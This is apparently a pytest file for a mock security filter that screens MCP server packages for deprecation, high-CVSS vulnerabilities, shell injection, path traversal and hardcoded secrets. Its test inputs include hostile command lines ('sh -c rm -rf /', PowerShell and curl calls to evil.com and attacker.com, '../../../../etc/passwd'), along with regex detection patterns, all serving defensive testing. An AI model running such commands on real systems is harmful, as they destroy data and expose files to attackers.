"""Tier 1 Feature 4: Deprecation & Vulnerability Filter.

Tests security, vulnerability, and maintenance gate checks:
- Explicit deprecation blacklists (e.g. aws-api-mcp-server)
- High/Critical CVE vulnerability rejection (CVSS >= 7.0)
- Low/Medium vulnerability advisory handling
- Shell injection pattern rejection (cmd.exe /c, sh -c, powershell -c)
- Directory traversal injection prevention
- Hardcoded API token and secret leak detection
"""

import re
import pytest
from typing import Dict, Any, List


class MockSecurityFilter:
    """Mock/Reference security filter implementation."""

    DEPRECATED_PACKAGE_IDS = {
        "aws-api-mcp-server",
        "deprecated-mcp-tools",
        "legacy-sqlite-bridge"
    }

    SUSPICIOUS_SHELL_PATTERNS = [
        re.compile(r"cmd\.exe\s+/c", re.IGNORECASE),
        re.compile(r"powershell(\.exe)?\s+(-c|-command)", re.IGNORECASE),
        re.compile(r"sh\s+-c", re.IGNORECASE),
        re.compile(r"bash\s+-c", re.IGNORECASE),
        re.compile(r"[;&|`$]"),
    ]

    SECRET_PATTERNS = [
        re.compile(r"sk-[a-zA-Z0-9]{32,}"),
        re.compile(r"ghp_[a-zA-Z0-9]{36}"),
        re.compile(r"(?i)aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}")
    ]

    @classmethod
    def audit_package(cls, pkg: Dict[str, Any], known_cves: List[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Audit candidate package against deprecation, CVEs, and injection hazards."""
        pkg_id = pkg.get("id", "")
        if pkg_id in cls.DEPRECATED_PACKAGE_IDS:
            return {"pass": False, "reason": f"Package '{pkg_id}' is explicitly deprecated"}

        # CVE check
        if known_cves:
            for cve in known_cves:
                score = cve.get("cvss", 0.0)
                if score >= 7.0:
                    return {"pass": False, "reason": f"CRITICAL CVE {cve.get('id')} with CVSS {score}"}

        # Command injection check
        entrypoint = pkg.get("entrypoint", {})
        command = entrypoint.get("command", "")
        args = entrypoint.get("args", [])
        full_invocation = f"{command} " + " ".join(args)

        for pat in cls.SUSPICIOUS_SHELL_PATTERNS:
            if pat.search(full_invocation):
                return {"pass": False, "reason": f"Command injection pattern detected: {full_invocation}"}

        # Path traversal check
        for token in [pkg_id, command] + args:
            if ".." in token or token.startswith("/etc") or token.startswith("C:\\Windows"):
                return {"pass": False, "reason": f"Path traversal detected in token: {token}"}

        # Secret leak check
        env = entrypoint.get("env", {})
        for k, v in env.items():
            for sec_pat in cls.SECRET_PATTERNS:
                if sec_pat.search(str(v)):
                    return {"pass": False, "reason": f"Hardcoded secret detected in env variable '{k}'"}

        return {"pass": True, "reason": "All security and deprecation checks passed"}


def test_f4_rejects_known_deprecated_packages():
    """Verify known deprecated packages (e.g. aws-api-mcp-server) are rejected immediately."""
    deprecated_candidate = {
        "id": "aws-api-mcp-server",
        "name": "Deprecated AWS MCP Server",
        "entrypoint": {"command": "npx", "args": ["aws-api-mcp-server"]}
    }
    result = MockSecurityFilter.audit_package(deprecated_candidate)
    assert result["pass"] is False
    assert "explicitly deprecated" in result["reason"]


def test_f4_rejects_critical_cve_package():
    """Verify packages with CVSS >= 7.0 are rejected."""
    vuln_pkg = {
        "id": "vulnerable-parser",
        "name": "Vulnerable Parser MCP",
        "entrypoint": {"command": "npx", "args": ["vuln-parser"]}
    }
    cves = [{"id": "CVE-2025-1337", "cvss": 9.8, "description": "Remote code execution"}]
    result = MockSecurityFilter.audit_package(vuln_pkg, known_cves=cves)
    assert result["pass"] is False
    assert "CRITICAL CVE" in result["reason"]


def test_f4_permits_low_cve_package():
    """Verify packages with CVSS < 7.0 are not hard-rejected by security filter."""
    low_cve_pkg = {
        "id": "low-risk-tool",
        "name": "Low Risk Tool",
        "entrypoint": {"command": "uvx", "args": ["low-tool"]}
    }
    cves = [{"id": "CVE-2024-0001", "cvss": 4.3, "description": "Minor info leak"}]
    result = MockSecurityFilter.audit_package(low_cve_pkg, known_cves=cves)
    assert result["pass"] is True


def test_f4_rejects_shell_command_injection_wrappers():
    """Verify malicious shell command wrappers are detected and rejected."""
    bad_commands = [
        {"command": "cmd.exe", "args": ["/c", "calc.exe"]},
        {"command": "powershell", "args": ["-Command", "Invoke-WebRequest http://evil.com"]},
        {"command": "sh", "args": ["-c", "rm -rf /"]},
        {"command": "npx", "args": ["server", ";", "curl http://attacker.com"]}
    ]
    for bc in bad_commands:
        pkg = {"id": "injection-test", "entrypoint": bc}
        res = MockSecurityFilter.audit_package(pkg)
        assert res["pass"] is False
        assert "Command injection pattern detected" in res["reason"]


def test_f4_rejects_path_traversal_attempts():
    """Verify path traversal tokens are intercepted."""
    traversal_pkg = {
        "id": "traversal-test",
        "entrypoint": {"command": "npx", "args": ["../../../../etc/passwd"]}
    }
    res = MockSecurityFilter.audit_package(traversal_pkg)
    assert res["pass"] is False
    assert "Path traversal detected" in res["reason"]


def test_f4_rejects_hardcoded_secrets_in_env():
    """Verify hardcoded API keys in env dictionary trigger rejection."""
    secret_pkg = {
        "id": "leaky-pkg",
        "entrypoint": {
            "command": "npx",
            "args": ["leaky-server"],
            "env": {
                "OPENAI_API_KEY": "sk-1234567890abcdef1234567890abcdef12345678"
            }
        }
    }
    res = MockSecurityFilter.audit_package(secret_pkg)
    assert res["pass"] is False
    assert "Hardcoded secret detected" in res["reason"]
